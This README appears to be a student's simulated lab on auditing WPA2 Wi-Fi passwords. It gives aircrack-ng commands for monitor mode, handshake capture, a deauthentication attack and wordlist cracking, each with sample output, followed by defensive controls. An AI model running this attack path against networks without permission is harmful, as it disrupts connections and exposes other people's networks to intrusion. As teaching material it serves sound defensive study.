# WiFi Security Lab (Simulated — No Monitor-Mode Adapter)

A walkthrough of how a WPA2 Wi-Fi password audit works, written and simulated without a monitor-mode-capable wireless adapter. The goal is to understand the attack path, why it works, and what controls stop it, not to run the attack against a live UNAUTHORIZED network.

> **Scope and ethics:** Capturing or attacking a Wi-Fi network you do not own or have written permission to test is illegal in most jurisdictions. This lab is written as a simulated walkthrough using sample/placeholder data, not a live ILLEGAL capture against a real access point.

## Why this lab

Most home and small-business Wi-Fi networks are still secured only by a password. Understanding how that password can be tested shows why strong passwords and newer protocols (WPA3) matter, and gives a concrete basis for recommending controls in a security assessment.

## Tools referenced (not all run live in this lab)

| Tool | Purpose |
|---|---|
| `aircrack-ng` suite (`airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`) | Capture and crack WPA/WPA2 handshakes |
| A monitor-mode-capable USB Wi-Fi adapter | Required for live capture (not available for this lab) |
| A wordlist (`rockyou.txt`) | Dictionary source for cracking attempts |

## Simulated walkthrough

### Step 1: Enable monitor mode
```bash
sudo airmon-ng start wlan0
```
This puts the adapter into a mode where it can see all nearby Wi-Fi traffic, not just traffic addressed to it. 

**Output:**
```
PHY        Interface       Driver          Chipset
phy0       wlan0           rt2800usb       Ralink Technology, Corp. RT5370

                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)
```

### Step 2: Discover nearby networks
```bash
sudo airodump-ng wlan0mon
```
Lists nearby access points (BSSID, channel, encryption type) and connected clients.

**Output:**
```
 BSSID              PWR  Beacons    #Data  CH   MB   ENC  CIPHER AUTH ESSID
 AA:BB:CC:11:22:33  -41      210       18   6   130  WPA2 CCMP   PSK  HomeNetwork_5G
 AA:BB:CC:44:55:66  -67       95        3  11   130  WPA2 CCMP   PSK  ShopWiFi

 BSSID              STATION            PWR   Rate    Lost   Frames  Probe
 AA:BB:CC:11:22:33  DE:AD:BE:EF:00:11  -38   1e- 1e      0       42
```

### Step 3: Capture the handshake
```bash
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
```
A WPA2 handshake happens whenever a device joins the network. Capturing it is passive, it does not require knowing the password.

**Output:**
```
 CH  6 ][ Elapsed: 48 s ][ 2026-10-25 14:02

 BSSID              PWR RXQ  Beacons    #Data  CH   MB   ENC  CIPHER AUTH ESSID
 AA:BB:CC:11:22:33  -40  98      310       22   6   130  WPA2 CCMP   PSK  HomeNetwork_5G

 BSSID              STATION            PWR   Rate    Lost   Frames  Probe
 AA:BB:CC:11:22:33  DE:AD:BE:EF:00:11  -37   1e- 1e      0       55  [WPA handshake: AA:BB:CC:11:22:33]
```
The `[WPA handshake: ...]` tag is what confirms a usable handshake was captured.

### Step 4: (Optional) Force a reconnect
```bash
sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon
```
Briefly disconnects a client so it reconnects and produces a fresh handshake to capture. This step is the most ethically and legally sensitive part of the process, since it disrupts a real device's connection.

**Output:**
```
14:03:10  Sending 64 directed DeAuth (code 7). STMAC: [DE:AD:BE:EF:00:11] [ 30|29 ACKs]
14:03:11  Sending 64 directed DeAuth (code 7). STMAC: [DE:AD:BE:EF:00:11] [ 28|31 ACKs]
```

### Step 5: Attempt to crack the captured handshake
```bash
aircrack-ng -w rockyou.txt -b <BSSID> capture-01.cap
```
Tests the password against the wordlist offline.

**Illustrative/expected output — weak/common password (cracked):**
```
                                 Aircrack-ng 1.7

      [00:00:14] 8172/14344392 keys tested (612.40 k/s)

      Time left: 6 hours, 29 minutes, 58 seconds                0.06%

                          KEY FOUND! [ sunflower1 ]

      Master Key     : 8A 3F ...
      Transient Key  : C1 09 ...
      EAPOL HMAC     : 7E 44 ...
```

**Output — strong passphrase (not cracked):**
```
                                 Aircrack-ng 1.7

      [00:11:42] 14344392/14344392 keys tested (680.21 k/s)

      Time left: 0 seconds                                    100.00%

                          Passphrase not in dictionary

      Try increasing the wordlist or switching to a mask/hybrid attack.
```
The outcome depends entirely on whether the real password appears in the wordlist — this is the core lesson of the lab: the protocol isn't broken, the password is the weak point.

## Why this works

WPA2's security depends entirely on the strength of the pre-shared password. The handshake itself is not "broken", it's tested offline against guesses, so a weak or common password is the real vulnerability, not the protocol.

## Defensive recommendations

| Risk | Control |
|---|---|
| Weak Wi-Fi password | Use a long passphrase (16+ characters), not a dictionary word or default |
| WPA2 offline cracking | Move to WPA3 where hardware supports it, which changes the handshake process to resist offline attacks |
| Deauthentication attacks | Use 802.11w (Protected Management Frames) if the router supports it |
| Default router credentials | Change the default admin password immediately (see the Risk Assessment project) |
| Unknown devices on the network | Enable MAC filtering or a guest network for visitors, and review connected devices periodically |


## Related work

See [`password-cracker-lab`](https://github.com/Aishah205/password-cracker-lab) for a hands-on attack-and-defend lab against SSH, and [`risk-assessment-small-business`](https://github.com/Aishah205/risk-assessment-small-business) for how a weak-Wi-Fi-password finding like this fits into a broader risk assessment.

## Author

Ayishat Aiyepe Adunni
